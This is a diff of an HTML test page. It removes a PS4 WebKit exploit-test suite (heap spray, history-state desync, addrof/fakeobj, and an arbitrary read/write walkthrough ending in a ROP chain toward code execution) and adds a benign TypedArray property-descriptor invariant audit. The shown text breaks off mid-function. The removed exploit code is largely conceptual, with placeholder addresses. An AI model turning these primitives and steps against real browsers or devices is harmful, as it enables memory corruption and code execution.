@@ -1,588 +1,450 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>PS4 WebKit Real Exploit - Based on PSFree Techniques</title>
+  <meta charset="UTF-8">
+  <title>PS4 POC Pack — TypedArray/ArrayBuffer Invariants (Minimal+Impact)</title>
 </head>
 <body>
+  <h1>PS4 POC Pack — TypedArray/ArrayBuffer Invariants (Minimal+Impact)</h1>
 
-<h1>PS4 WebKit - Técnicas REAIS do PSFree (CVE-2022-22620)</h1>
+  <button id="btnReset">Reset log</button>
+  <button id="btnRunAll">Run ALL (T1 + A + B + C + D + T8)</button>
+  <hr>
 
-<p><strong>Baseado em:</strong> PSFree exploit por abc/CelesteBlue para PS4 9.00-9.60</p>
-<p><strong>CVE:</strong> CVE-2022-22620 - WebKit Use-After-Free</p>
+  <button id="btnT1">T1 :: AB.byteLength descriptor audit (+ policy)</button>
+  <button id="btnA">A :: Object.defineProperty on ta[0] (+ policy)</button>
+  <button id="btnB">B :: Reflect.defineProperty on ta[0] (+ policy)</button>
+  <button id="btnC">C :: Proxy wrapper invariants (+ policy)</button>
+  <button id="btnD">D :: Cross-realm iframe reproduce (+ policy)</button>
+  <button id="btnT8">T8 :: MessageChannel transfer DROP detector</button>
 
-<hr>
+  <p>
+    N (T8 reps): <input id="t8N" type="number" value="30" min="1" step="1">
+    Delay (ms): <input id="t8Delay" type="number" value="50" min="0" step="10">
+    Timeout (ms): <input id="t8Timeout" type="number" value="1200" min="50" step="50">
+  </p>
 
-<h2>Teste 1: buildBubbleTree UAF (Base do PSFree)</h2>
-<button onclick="runTest1()">Executar</button>
-<pre id="log1"></pre>
-
-<hr>
-
-<h2>Teste 2: SerializedScriptValue Corruption</h2>
-<button onclick="runTest2()">Executar</button>
-<pre id="log2"></pre>
-
-<hr>
-
-<h2>Teste 3: JSArrayBufferView Length Corruption</h2>
-<button onclick="runTest3()">Executar</button>
-<pre id="log3"></pre>
-
-<hr>
-
-<h2>Teste 4: addrof Primitive (Object → Address)</h2>
-<button onclick="runTest4()">Executar</button>
-<pre id="log4"></pre>
-
-<hr>
-
-<h2>Teste 5: fakeobj Primitive (Address → Object)</h2>
-<button onclick="runTest5()">Executar</button>
-<pre id="log5"></pre>
-
-<hr>
-
-<h2>Teste 6: Arbitrary Read Primitive</h2>
-<button onclick="runTest6()">Executar</button>
-<pre id="log6"></pre>
-
-<hr>
-
-<h2>Teste 7: Arbitrary Write Primitive</h2>
-<button onclick="runTest7()">Executar</button>
-<pre id="log7"></pre>
+  <pre id="log" style="white-space:pre-wrap;"></pre>
 
 <script>
-(function(){
-"use strict";
+(() => {
+  "use strict";
 
-function log(id, msg) {
-  document.getElementById(id).textContent += msg + '\n';
-}
+  const $log = document.getElementById("log");
+  let STOP = false;
+  let RUN_ID = 0;
 
-function clear(id) {
-  document.getElementById(id).textContent = '';
-}
+  function ts(){ return Date.now(); }
+  function logLine(s){ $log.textContent += `[${ts()}] ${s}\n`; }
+  function resetLog(){ $log.textContent=""; logLine("Reset."); }
 
-// Funções de conversão (padrão do PSFree)
-function p2f(val) {
-  // Converte pair de uint32 para float64
-  const buf = new ArrayBuffer(8);
-  const u32 = new Uint32Array(buf);
-  const f64 = new Float64Array(buf);
-  u32[0] = val[0];
-  u32[1] = val[1];
-  return f64[0];
-}
-
-function f2p(val) {
-  // Converte float64 para pair de uint32
-  const buf = new ArrayBuffer(8);
-  const u32 = new Uint32Array(buf);
-  const f64 = new Float64Array(buf);
-  f64[0] = val;
-  return [u32[0], u32[1]];
-}
-
-function hex(val) {
-  if (typeof val === 'number') {
-    return '0x' + val.toString(16).padStart(8, '0');
+  function j(x){
+    try { return JSON.stringify(x, null, 2); } catch(e){ return String(x); }
   }
-  return '0x' + val;
-}
 
-// =============================================
-// TESTE 1: buildBubbleTree UAF
-// =============================================
-window.runTest1 = function() {
-  clear('log1');
-  log('log1', '=== TESTE 1: buildBubbleTree UAF ===\n');
-  log('log1', 'Baseado em: 0xdagger e abu_y0ussef exploit framework\n');
-  
-  // Padrão do PSFree: criar arrays com "buracos"
-  const SPRAY_SIZE = 0x10000;
-  const NUM_SPRAY = 0x100;
-  
-  log('log1', 'Criando spray de arrays...');
-  log('log1', `Size: ${hex(SPRAY_SIZE)} | Count: ${hex(NUM_SPRAY)}\n`);
-  
-  const spray = [];
-  for (let i = 0; i < NUM_SPRAY; i++) {
-    const arr = new Array(SPRAY_SIZE);
-    // Preenche com doubles (NaN-boxed floats)
-    for (let j = 0; j < SPRAY_SIZE; j++) {
-      arr[j] = 1.1 + j;
-    }
-    spray.push(arr);
+  function section(title){
+    logLine("============================================================");
+    logLine(title);
+    logLine("============================================================");
   }
-  
-  log('log1', 'Spray criado.');
-  
-  // Libera alguns arrays (cria "buracos")
-  log('log1', 'Liberando arrays alternados...\n');
-  for (let i = 0; i < NUM_SPRAY; i += 2) {
-    spray[i] = null;
+
+  function safeCall(fn){
+    try { return { threw:false, val: fn() }; }
+    catch(e){ return { threw:true, err:(e&&e.name)||"ERR", msg:(e&&e.message)||"" }; }
   }
-  
-  // Force GC
-  for (let i = 0; i < 100; i++) {
-    new ArrayBuffer(1024 * 1024);
+
+  function tryGetDesc(obj, prop){
+    const r = safeCall(() => Object.getOwnPropertyDescriptor(obj, prop) || null);
+    if (r.threw) return { threw:true, err:r.err };
+    return r.val;
   }
-  
-  log('log1', 'GC forçado. Heap tem buracos agora.');
-  
-  // Aloca objetos nos buracos
-  log('log1', '\nAlocando objetos controlados...');
-  const controlled = [];
-  for (let i = 0; i < NUM_SPRAY / 2; i++) {
-    const obj = {
-      a: 0x41414141,
-      b: 0x42424242,
-      c: 0x43434343
+
+  function verdictLine(name, ok, detailsObj){
+    logLine(`${ok ? "PASS" : "FAIL"} :: ${name}${detailsObj ? " :: " + j(detailsObj).replace(/\n/g, " ") : ""}`);
+  }
+
+  function hardeningPolicyOnIndex(realm, label, target, key /* "0" */){
+    // Policy model (non-exploit):
+    // - If descriptor claims configurable:true, we SHOULD be able to delete.
+    // - If engine refuses delete while saying configurable:true -> enforcement mismatch.
+    // - Try "normalize": defineProperty configurable:false and see if descriptor updates.
+    const Object_ = realm.Object || Object;
+    const Reflect_ = realm.Reflect || Reflect;
+
+    const out = {
+      key,
+      preDesc: null,
+      claimedConfigurable: null,
+      delDeleteOp: null,
+      delReflect: null,
+      postDelDesc: null,
+      normalizeDefine: null,
+      postNormalizeDesc: null,
+      ownKeys: null
     };
-    controlled.push(obj);
-  }
-  
-  log('log1', `Alocados ${controlled.length} objetos`);
-  
-  // Verifica se conseguimos corromper
-  log('log1', '\n--- Verificando corrupção ---');
-  
-  let corrupted = 0;
-  for (let i = 0; i < spray.length; i++) {
-    if (spray[i] !== null) {
-      // Verifica se valores mudaram
-      for (let j = 0; j < 10; j++) {
-        const expected = 1.1 + j;
-        const actual = spray[i][j];
-        if (actual !== expected) {
-          log('log1', `spray[${i}][${j}] = ${actual} (esperado ${expected})`);
-          corrupted++;
-        }
-      }
-    }
-  }
-  
-  if (corrupted > 0) {
-    log('log1', `\n[SUCESSO] ${corrupted} valores corrompidos!`);
-  } else {
-    log('log1', '\nNenhuma corrupção detectada (esperado em alguns browsers).');
-  }
-};
 
-// =============================================
-// TESTE 2: SerializedScriptValue Corruption
-// =============================================
-window.runTest2 = function() {
-  clear('log2');
-  log('log2', '=== TESTE 2: SerializedScriptValue Corruption ===\n');
-  log('log2', 'Técnica do PSFree: corromper destructor ~SerializedScriptValue()\n');
-  
-  // Cria estruturas complexas que serão serializadas
-  const complex = [];
-  
-  for (let i = 0; i < 100; i++) {
-    const obj = {
-      id: i,
-      data: new Uint8Array(1024),
-      nested: {
-        arr: new Array(100).fill(i),
-        buf: new ArrayBuffer(512)
-      }
-    };
-    complex.push(obj);
-  }
-  
-  log('log2', 'Objetos complexos criados.\n');
-  
-  // Usa history.replaceState para serializar
-  log('log2', 'Serializando via history.replaceState...');
-  
-  history.replaceState(null, '', location.href);
-  history.pushState(null, '', location.href);
-  
-  for (let i = 0; i < 200; i++) {
-    history.replaceState({
-      seq: i,
-      complex: complex
-    }, '', location.href);
-  }
-  
-  const state = history.state;
-  log('log2', `Seq retornado: ${state.seq}\n`);
-  
-  // Verifica se objetos foram corrompidos
-  if (state.complex && state.complex[0]) {
-    log('log2', 'Verificando integridade dos objetos serializados:');
-    
-    let issues = 0;
-    for (let i = 0; i < Math.min(10, state.complex.length); i++) {
-      const obj = state.complex[i];
-      
-      if (obj.id !== i) {
-        log('log2', `  [${i}] ID corrompido: ${obj.id} (esperado ${i})`);
-        issues++;
-      }
-      
-      if (obj.nested && obj.nested.arr) {
-        const first = obj.nested.arr[0];
-        if (first !== i) {
-          log('log2', `  [${i}] Array corrompido: ${first} (esperado ${i})`);
-          issues++;
-        }
-      }
-    }
-    
-    if (issues > 0) {
-      log('log2', `\n[SUCESSO] ${issues} corrupções encontradas!`);
-    } else {
-      log('log2', '\nObjetos íntegros (desync não causou corrupção detectável).');
-    }
-  }
-};
+    out.preDesc = safeCall(() => Object_.getOwnPropertyDescriptor(target, key));
+    const preD = out.preDesc.threw ? null : out.preDesc.val;
+    out.claimedConfigurable = preD && typeof preD === "object" ? preD.configurable : undefined;
 
-// =============================================
-// TESTE 3: JSArrayBufferView Length Corruption
-// =============================================
-window.runTest3 = function() {
-  clear('log3');
-  log('log3', '=== TESTE 3: JSArrayBufferView Length Corruption ===\n');
-  log('log3', 'Objetivo: Corromper length do TypedArray para OOB access\n');
-  
-  // Cria ArrayBuffer e TypedArray
-  const buf = new ArrayBuffer(0x1000);
-  const view = new Uint32Array(buf);
-  
-  log('log3', `ArrayBuffer: ${buf.byteLength} bytes`);
-  log('log3', `Uint32Array length: ${view.length}\n`);
-  
-  // Preenche com padrão
-  for (let i = 0; i < view.length; i++) {
-    view[i] = 0x41414141 + i;
-  }
-  
-  log('log3', 'Padrão escrito. Tentando corromper length...\n');
-  
-  // Técnica: usar desync para corromper length field
-  history.replaceState(null, '', location.href);
-  history.pushState(null, '', location.href);
-  
-  // Array que vamos tentar misturar
-  const corruptArr = new Uint32Array(new ArrayBuffer(0x1000));
-  corruptArr.fill(0xdeadbeef);
-  
-  for (let i = 0; i < 200; i++) {
-    const state = {
-      seq: i,
-      view: view,
-      corrupt: corruptArr
-    };
-    
-    // Tenta forçar type confusion
-    if (i === 100) {
-      // Neste ponto, tentamos substituir
-      state.view = corruptArr;
-    }
-    
-    history.replaceState(state, '', location.href);
-  }
-  
-  const final = history.state;
-  
-  log('log3', `Seq retornado: ${final.seq}`);
-  
-  if (final.view) {
-    log('log3', `\nView final length: ${final.view.length}`);
-    log('log3', `Buffer byteLength: ${final.view.buffer.byteLength}\n`);
-    
-    // Tenta OOB read
-    log('log3', 'Tentando OOB read...');
-    
-    let oob_success = false;
-    for (let i = final.view.length; i < final.view.length + 100; i++) {
-      try {
-        const val = final.view[i];
-        if (val !== undefined) {
-          log('log3', `  view[${i}] = ${hex(val)} <<< OOB READ!`);
-          oob_success = true;
-        }
-      } catch(e) {
-        break;
-      }
-    }
-    
-    if (oob_success) {
-      log('log3', '\n[SUCESSO] OOB read funcionou!');
-    } else {
-      log('log3', '\nOOB bloqueado (bounds check ativo).');
-    }
-  }
-};
+    out.delDeleteOp = safeCall(() => { return (delete target[key]); });
+    out.delReflect = safeCall(() => Reflect_.deleteProperty(target, key));
+    out.postDelDesc = safeCall(() => Object_.getOwnPropertyDescriptor(target, key));
 
-// =============================================
-// TESTE 4: addrof Primitive
-// =============================================
-window.runTest4 = function() {
-  clear('log4');
-  log('log4', '=== TESTE 4: addrof Primitive ===\n');
-  log('log4', 'Baseado na técnica do PSFree\n');
-  
-  // Objeto cujo endereço queremos vazar
-  const target = {
-    marker: 'TARGET_FOR_ADDROF',
-    value: 0xdeadbeef
-  };
-  
-  log('log4', 'Objeto target criado:');
-  log('log4', `  marker: ${target.marker}`);
-  log('log4', `  value: ${hex(target.value)}\n`);
-  
-  // Array misto (objetos e floats)
-  const mixed = [
-    1.1,
-    target,
-    2.2,
-    target,
-    3.3
-  ];
-  
-  log('log4', 'Array misto criado (floats e objects)');
-  log('log4', 'Tipo dos elementos:');
-  for (let i = 0; i < mixed.length; i++) {
-    log('log4', `  [${i}] ${typeof mixed[i]}`);
-  }
-  log('log4', '');
-  
-  // Técnica addrof: forçar engine a tratar objeto como float
-  // Isso vaza o ponteiro do objeto como valor float
-  
-  log('log4', 'Tentando type confusion (object → float)...\n');
-  
-  // Cria array de floats
-  const floatArr = [1.1, 2.2, 3.3, 4.4, 5.5];
-  
-  // Substitui um float por objeto
-  floatArr[2] = target;
-  
-  log('log4', 'FloatArr após inserir target:');
-  for (let i = 0; i < floatArr.length; i++) {
-    const val = floatArr[i];
-    const type = typeof val;
-    log('log4', `  [${i}] type=${type}`);
-    
-    if (type === 'number') {
-      const pair = f2p(val);
-      log('log4', `       float=${val}`);
-      log('log4', `       pair=[${hex(pair[0])}, ${hex(pair[1])}]`);
-      
-      // Se valor parece um ponteiro (>0x1000000)
-      if (val > 0x1000000 && val < 0x800000000000) {
-        log('log4', '       ^^^ POSSÍVEL PONTEIRO VAZADO!');
-      }
-    }
-  }
-  
-  log('log4', '\n--- Técnica alternativa ---');
-  
-  // Usa DataView para tentar vazar
-  const leakBuf = new ArrayBuffer(64);
-  const leakView = new DataView(leakBuf);
-  const leakF64 = new Float64Array(leakBuf);
-  
-  // Coloca objeto e tenta ler como float
-  const container = [target, leakF64];
-  
-  log('log4', 'Container com target e Float64Array criado.');
-  log('log4', 'Se conseguirmos type confusion, podemos ler ponteiro.\n');
-  
-  log('log4', '[INFO] addrof completo requer:');
-  log('log4', '1. Corromper JSArray para aceitar objetos como floats');
-  log('log4', '2. Ler o valor float = endereço do objeto');
-  log('log4', '3. Isso bypassa ASLR');
-};
+    // Try to "normalize" (if engine allows). This is still non-exploit: integrity enforcement attempt.
+    out.normalizeDefine = safeCall(() => {
+      return Reflect_.defineProperty(target, key, { value: 9, writable: true, enumerable: true, configurable: false });
+    });
 
-// =============================================
-// TESTE 5: fakeobj Primitive
-// =============================================
-window.runTest5 = function() {
-  clear('log5');
-  log('log5', '=== TESTE 5: fakeobj Primitive ===\n');
-  log('log5', 'Inverso do addrof: tratar endereço como objeto\n');
-  
-  // Simula endereço (em exploit real, viria do addrof)
-  const fakeAddr = [0x12345678, 0x7f8a4c00]; // [low, high]
-  const fakeFloat = p2f(fakeAddr);
-  
-  log('log5', `Endereço fake: [${hex(fakeAddr[0])}, ${hex(fakeAddr[1])}]`);
-  log('log5', `Como float: ${fakeFloat}\n`);
-  
-  // Cria array de floats
-  const floatArr = [1.1, 2.2, fakeFloat, 4.4, 5.5];
-  
-  log('log5', 'Array de floats com endereço fake inserido.');
-  log('log5', 'Se conseguirmos type confusion inversa:');
-  log('log5', 'float → object, podemos criar objeto falso.\n');
-  
-  // Tenta acessar como objeto
-  log('log5', 'Tentando acessar floatArr[2] como objeto...');
-  
-  const maybe_obj = floatArr[2];
-  log('log5', `typeof floatArr[2] = ${typeof maybe_obj}`);
-  
-  if (typeof maybe_obj === 'object') {
-    log('log5', '\n[SUCESSO] Type confusion! Float virou objeto!');
-    log('log5', 'Propriedades:');
+    out.postNormalizeDesc = safeCall(() => Object_.getOwnPropertyDescriptor(target, key));
+    out.ownKeys = safeCall(() => Reflect_.ownKeys(target));
+
+    // Determine mismatch:
+    // Mismatch = descriptor CLAIMS configurable:true, but delete fails/throws.
+    const claimed = (out.claimedConfigurable === true);
+    const delFailed =
+      out.delDeleteOp.threw || out.delDeleteOp.val === false ||
+      out.delReflect.threw || out.delReflect.val === false;
+
+    const mismatch = claimed && delFailed;
+
+    return { mismatch, out };
+  }
+
+  function typedArrayCase(label, defineFn){
+    section(`POC ${label}: TypedArray index invariants (+ policy)`);
+    const ta = new Uint8Array(16);
+    ta[0] = 7;
+
+    const baselineOwnDesc = tryGetDesc(ta, "0");
+    logLine(`${label} baseline desc(ta,"0")=${j(baselineOwnDesc)}`);
+
+    // Step: defineProperty per variant
+    let defineRes = { ok:null, threw:false, err:null, desc:null };
     try {
-      const keys = Object.keys(maybe_obj);
-      log('log5', `  keys: ${keys}`);
-    } catch(e) {
-      log('log5', `  Erro ao acessar: ${e.message}`);
+      const ok = defineFn(ta);
+      defineRes.ok = ok;
+      defineRes.desc = tryGetDesc(ta, "0");
+    } catch(e){
+      defineRes.threw = true;
+      defineRes.err = (e && e.name) ? e.name : "ERR";
+      defineRes.desc = tryGetDesc(ta, "0");
     }
-  } else {
-    log('log5', '\nAinda é float. Type confusion não ocorreu.');
-  }
-  
-  log('log5', '\n--- Estrutura de fake object ---');
-  log('log5', 'Em exploit real, construiríamos JSObject fake:');
-  log('log5', '  [0:8]   JSCell header');
-  log('log5', '  [8:16]  Structure pointer');
-  log('log5', '  [16:24] Butterfly pointer');
-  log('log5', '\nCom esses ponteiros controlados = arbitrary R/W');
-};
+    logLine(`${label} defineProperty result=${j(defineRes)}`);
+    logLine(`${label} after define, ta[0]=${ta[0]}`);
 
-// =============================================
-// TESTE 6: Arbitrary Read Primitive
-// =============================================
-window.runTest6 = function() {
-  clear('log6');
-  log('log6', '=== TESTE 6: Arbitrary Read ===\n');
-  log('log6', 'Combina addrof + ArrayBuffer corruption\n');
-  
-  // Cria ArrayBuffer que vamos usar para read
-  const readBuf = new ArrayBuffer(0x1000);
-  const readView = new Uint32Array(readBuf);
-  
-  log('log6', `Read buffer: ${readBuf.byteLength} bytes`);
-  log('log6', `View length: ${readView.length}\n`);
-  
-  // Em exploit real, faríamos:
-  // 1. addrof(readBuf) → pega endereço do ArrayBuffer
-  // 2. Corromper backing store pointer do ArrayBuffer
-  // 3. Fazer apontar para endereço que queremos ler
-  // 4. Ler via readView[0], readView[1], etc
-  
-  log('log6', 'Passos para arbitrary read:');
-  log('log6', '1. addrof(ArrayBuffer) → endereço do buffer');
-  log('log6', '2. Calcular offset do backing store pointer');
-  log('log6', '3. write64(buffer_addr + offset, target_addr)');
-  log('log6', '4. Ler via TypedArray = lê target_addr\n');
-  
-  // Demonstração conceitual
-  const target_addr = [0xdeadbeef, 0x7f8a4c00];
-  log('log6', `Endereço alvo: [${hex(target_addr[0])}, ${hex(target_addr[1])}]`);
-  
-  // Se conseguíssemos mudar backing store...
-  log('log6', '\nSe conseguirmos corromper backing store pointer:');
-  log('log6', 'readView[0] = lê uint32 em target_addr');
-  log('log6', 'readView[1] = lê uint32 em target_addr + 4');
-  log('log6', 'etc.\n');
-  
-  // Tenta via desync
-  history.replaceState(null, '', location.href);
-  history.pushState(null, '', location.href);
-  
-  for (let i = 0; i < 200; i++) {
-    history.replaceState({
-      seq: i,
-      readBuf: readBuf,
-      readView: readView
-    }, '', location.href);
-  }
-  
-  const final = history.state;
-  
-  if (final.readView) {
-    log('log6', 'View preservado. Conteúdo:');
-    for (let i = 0; i < 8; i++) {
-      log('log6', `  readView[${i}] = ${hex(final.readView[i])}`);
+    // Mutate value (normal)
+    ta[0] = 0x33;
+
+    // Run hardening policy simulation on index "0"
+    const pol = hardeningPolicyOnIndex({ Object, Reflect }, label, ta, "0");
+
+    // Compact summary for triage
+    const preD = pol.out.preDesc.threw ? null : pol.out.preDesc.val;
+    const postD = pol.out.postNormalizeDesc.threw ? null : pol.out.postNormalizeDesc.val;
+
+    const summary = {
+      ta0_afterWrite: ta[0],
+      claimedConfigurable: pol.out.claimedConfigurable,
+      deleteOp: pol.out.delDeleteOp.threw ? ("THREW:"+pol.out.delDeleteOp.err) : pol.out.delDeleteOp.val,
+      reflectDelete: pol.out.delReflect.threw ? ("THREW:"+pol.out.delReflect.err) : pol.out.delReflect.val,
+      normalizeDefine: pol.out.normalizeDefine.threw ? ("THREW:"+pol.out.normalizeDefine.err) : pol.out.normalizeDefine.val,
+      preDesc: preD,
+      postNormalizeDesc: postD
+    };
+
+    if (pol.mismatch) {
+      logLine(`ALERTA: ${label} policy FAIL :: engine reporta configurable:true mas delete falha/lança (invariantes inconsistentes).`);
+      verdictLine(`${label}/PolicyEnforcement`, false, summary);
+    } else {
+      verdictLine(`${label}/PolicyEnforcement`, true, summary);
     }
   }
-  
-  log('log6', '\n[INFO] Arbitrary read completo = primitive mais poderoso');
-  log('log6', 'Permite vazar qualquer memória do processo');
-};
 
-// =============================================
-// TESTE 7: Arbitrary Write Primitive
-// =============================================
-window.runTest7 = function() {
-  clear('log7');
-  log('log7', '=== TESTE 7: Arbitrary Write ===\n');
-  log('log7', 'Mesma técnica do read, mas escrevendo\n');
-  
-  const writeBuf = new ArrayBuffer(0x1000);
-  const writeView = new Uint32Array(writeBuf);
-  
-  log('log7', `Write buffer: ${writeBuf.byteLength} bytes\n`);
-  
-  // Passos
-  log('log7', 'Passos para arbitrary write:');
-  log('log7', '1. Corromper backing store pointer (igual ao read)');
-  log('log7', '2. writeView[0] = valor → escreve em target_addr');
-  log('log7', '3. Podemos sobrescrever qualquer memória\n');
-  
-  // Usos
-  log('log7', 'Usos de arbitrary write:');
-  log('log7', '- Sobrescrever vtable pointers');
-  log('log7', '- Modificar código JIT');
-  log('log7', '- Corromper function pointers');
-  log('log7', '- Bypassar W^X (Write XOR Execute)\n');
-  
-  // Demonstração
-  log('log7', '--- Demonstração conceitual ---');
-  
-  const target_addr = [0x12345000, 0x7f8a0000];
-  const value_to_write = 0xcafebabe;
-  
-  log('log7', `Target: [${hex(target_addr[0])}, ${hex(target_addr[1])}]`);
-  log('log7', `Value: ${hex(value_to_write)}`);
-  log('log7', '');
-  log('log7', 'Se backing store apontasse para target:');
-  log('log7', `writeView[0] = ${hex(value_to_write)}`);
-  log('log7', `→ Memória em target_addr = ${hex(value_to_write)}\n`);
-  
-  // Exemplo de ROP chain
-  log('log7', '--- Exemplo: Escrever ROP chain ---');
-  
-  const ropChain = [
-    0x12345678, // gadget 1: pop rdi; ret
-    0xdeadbeef, // arg1
-    0x23456789, // gadget 2: pop rsi; ret
-    0xcafebabe, // arg2
-    0x34567890  // gadget 3: call rax
-  ];
-  
-  log('log7', 'ROP chain:');
-  ropChain.forEach((gadget, i) => {
-    log('log7', `  [${i}] ${hex(gadget)}`);
-  });
-  
-  log('log7', '\nCom arbitrary write:');
-  log('log7', '1. Encontrar stack pointer (via leak)');
-  log('log7', '2. Sobrescrever return address com ROP');
-  log('log7', '3. Retornar de função = executa ROP');
-  log('log7', '4. ROP chama system()/execve()');
-  log('log7', '5. RCE completo!\n');
-  
-  log('log7', '[SUCESSO] Com addrof + fakeobj + arb R/W:');
-  log('log7', '→ Full memory control');
-  log('log7', '→ Code execution');
-  log('log7', '→ Kernel exploit stage ready');
-};
+  // --- T1: ArrayBuffer.prototype.byteLength descriptor audit + policy test
+  function runT1(){
+    section("T1 :: ArrayBuffer.prototype.byteLength descriptor audit (+ policy)");
+    const desc = tryGetDesc(ArrayBuffer.prototype, "byteLength");
+    logLine(`T1 desc(ArrayBuffer.prototype,"byteLength")=${j(desc)}`);
 
+    // Policy simulation: if configurable:true, attempt to lock it down (defineProperty configurable:false)
+    // NOTE: This is not exploitation; it's a demonstration of whether descriptor-based policy is meaningful here.
+    const attempt = safeCall(() => {
+      return Reflect.defineProperty(ArrayBuffer.prototype, "byteLength", { configurable: false });
+    });
+
+    const desc2 = tryGetDesc(ArrayBuffer.prototype, "byteLength");
+
+    // Small detach sample to show transfers work (not a vuln)
+    const ab = new ArrayBuffer(16);
+    const beforeLen = ab.byteLength;
+    let det = { attempted:false, ok:false, via:null, err:null };
+    if (typeof structuredClone === "function") {
+      det.attempted = true;
+      det.via = "structuredClone";
+      try { structuredClone(ab, { transfer:[ab] }); det.ok = true; }
+      catch(e){ det.ok = false; det.err = (e&&e.name)||"ERR"; }
+    }
+    const afterLen = ab.byteLength;
+
+    const policyInfo = {
+      definePropertyResult: attempt.threw ? ("THREW:"+attempt.err) : attempt.val,
+      descBefore: desc,
+      descAfter: desc2,
+      detachSample: { beforeLen, afterLen, det }
+    };
+
+    // We don't assert "impossible" here; we assert "policy meaningfulness":
+    // If desc says configurable but defineProperty behavior doesn't align, that's also an enforcement mismatch surface.
+    const cfg = desc && typeof desc === "object" ? desc.configurable : undefined;
+    const attemptFailed = attempt.threw;
+
+    if (cfg === true && attemptFailed) {
+      logLine("ALERTA: T1 policy mismatch :: descriptor sugere configurável, mas policy (defineProperty) falhou/lançou.");
+      verdictLine("T1/DescriptorPolicy", false, policyInfo);
+    } else {
+      verdictLine("T1/DescriptorPolicy", true, policyInfo);
+    }
+  }
+
+  // --- A/B/C
+  function runA(){
+    typedArrayCase("A", (ta) => {
+      Object.defineProperty(ta, "0", { value: 9, writable: true, enumerable: true, configurable: true });
+      return true;
+    });
+  }
+
+  function runB(){
+    typedArrayCase("B", (ta) => {
+      return Reflect.defineProperty(ta, "0", { value: 9, writable: true, enumerable: true, configurable: true });
+    });
+  }
+
+  function runC(){
+    section("POC C: Proxy wrapper invariants (+ policy)");
+    const ta = new Uint8Array(16);
+    ta[0] = 7;
+
+    const baselineOwnDesc = tryGetDesc(ta, "0");
+    logLine(`C baseline desc(ta,"0")=${j(baselineOwnDesc)}`);
+
+    const p = new Proxy(ta, {
+      defineProperty(target, prop, desc) { return Reflect.defineProperty(target, prop, desc); },
+      getOwnPropertyDescriptor(target, prop) { return Reflect.getOwnPropertyDescriptor(target, prop); },
+      deleteProperty(target, prop) { return Reflect.deleteProperty(target, prop); },
+      ownKeys(target) { return Reflect.ownKeys(target); }
+    });
+
+    // Apply defineProperty via Proxy
+    const defineRes = safeCall(() => Reflect.defineProperty(p, "0", { value: 9, writable: true, enumerable: true, configurable: true }));
+    const descAfterDefine = safeCall(() => Reflect.getOwnPropertyDescriptor(p, "0"));
+    logLine(`C defineProperty via Proxy => ${j({ defineRes, descAfterDefine, ta0: ta[0] })}`);
+
+    ta[0] = 0x33;
+
+    // Policy hardening on Proxy target "0"
+    const pol = hardeningPolicyOnIndex({ Object, Reflect }, "C", p, "0");
+
+    const preD = pol.out.preDesc.threw ? null : pol.out.preDesc.val;
+    const postD = pol.out.postNormalizeDesc.threw ? null : pol.out.postNormalizeDesc.val;
+
+    const summary = {
+      ta0_afterWrite: ta[0],
+      claimedConfigurable: pol.out.claimedConfigurable,
+      deleteOp: pol.out.delDeleteOp.threw ? ("THREW:"+pol.out.delDeleteOp.err) : pol.out.delDeleteOp.val,
+      reflectDelete: pol.out.delReflect.threw ? ("THREW:"+pol.out.delReflect.err) : pol.out.delReflect.val,
+      normalizeDefine: pol.out.normalizeDefine.threw ? ("THREW:"+pol.out.normalizeDefine.err) : pol.out.normalizeDefine.val,
+      preDesc: preD,
+      postNormalizeDesc: postD
+    };
+
+    if (pol.mismatch) {
+      logLine("ALERTA: C policy FAIL via Proxy :: configurable:true reportado, delete falha/lança.");
+      verdictLine("C/PolicyEnforcement", false, summary);
+    } else {
+      verdictLine("C/PolicyEnforcement", true, summary);
+    }
+  }
+
+  // --- D (iframe)
+  function runD(){
+    section("POC D: Cross-realm iframe reproduce (+ policy)");
+    const f = document.createElement("iframe");
+    document.body.appendChild(f);
+
+    try {
+      const w = f.contentWindow;
+      const ta = new w.Uint8Array(16);
+      ta[0] = 7;
+
+      // defineProperty in iframe realm
+      const defineRes = safeCall(() => w.Reflect.defineProperty(ta, "0", { value: 9, writable: true, enumerable: true, configurable: true }));
+      const desc = safeCall(() => w.Object.getOwnPropertyDescriptor(ta, "0"));
+      logLine(`D defineProperty in iframe => ${j({ defineRes, desc, ta0: ta[0] })}`);
+
+      ta[0] = 0x33;
+
+      // Policy hardening in iframe realm
+      const pol = hardeningPolicyOnIndex({ Object: w.Object, Reflect: w.Reflect }, "D", ta, "0");
+
+      const preD = pol.out.preDesc.threw ? null : pol.out.preDesc.val;
+      const postD = pol.out.postNormalizeDesc.threw ? null : pol.out.postNormalizeDesc.val;
+
+      const summary = {
+        ta0_afterWrite: ta[0],
+        claimedConfigurable: pol.out.claimedConfigurable,
+        deleteOp: pol.out.delDeleteOp.threw ? ("THREW:"+pol.out.delDeleteOp.err) : pol.out.delDeleteOp.val,
+        reflectDelete: pol.out.delReflect.threw ? ("THREW:"+pol.out.delReflect.err) : pol.out.delReflect.val,
+        normalizeDefine: pol.out.normalizeDefine.threw ? ("THREW:"+pol.out.normalizeDefine.err) : pol.out.normalizeDefine.val,
+        preDesc: preD,
+        postNormalizeDesc: postD
+      };
+
+      if (pol.mismatch) {
+        logLine("ALERTA: D cross-realm policy FAIL :: configurable:true reportado, delete falha/lança.");
+        verdictLine("D/CrossRealmPolicyEnforcement", false, summary);
+      } else {
+        verdictLine("D/CrossRealmPolicyEnforcement", true, summary);
+      }
+
+    } catch(e){
+      logLine(`ERRO: D falhou: ${(e&&e.name)||"ERR"}`);
+    } finally {
+      try { f.remove(); } catch(_) {}
+    }
+  }
+
+  // --- T8: MessageChannel transfer DROP detector
+  async function withTimeout(promise, ms){
+    let t;
+    const timeout = new Promise((_, rej) => { t = setTimeout(() => rej(new Error("TIMEOUT")), ms); });
+    try { return await Promise.race([promise, timeout]); }
+    finally { clearTimeout(t); }
+  }
+  function delay(ms){ return new Promise(r => setTimeout(r, ms)); }
+
+  async function runT8(){
+    section("T8 :: MessageChannel transfer DROP detector (handshake)");
+
+    if (typeof MessageChannel !== "function") {
+      logLine("INFO: MessageChannel não disponível.");
+      return;
+    }
+
+    const N = Math.max(1, parseInt(document.getElementById("t8N").value || "30", 10));
+    const delayMs = Math.max(0, parseInt(document.getElementById("t8Delay").value || "50", 10));
+    const timeoutMs = Math.max(50, parseInt(document.getElementById("t8Timeout").value || "1200", 10));
+    logLine(`Config :: N=${N} delayMs=${delayMs} timeoutMs=${timeoutMs}`);
+
+    const stats = {
+      ok_detach: 0,
+      ok_clone: 0,
+      transfer_throw: 0,
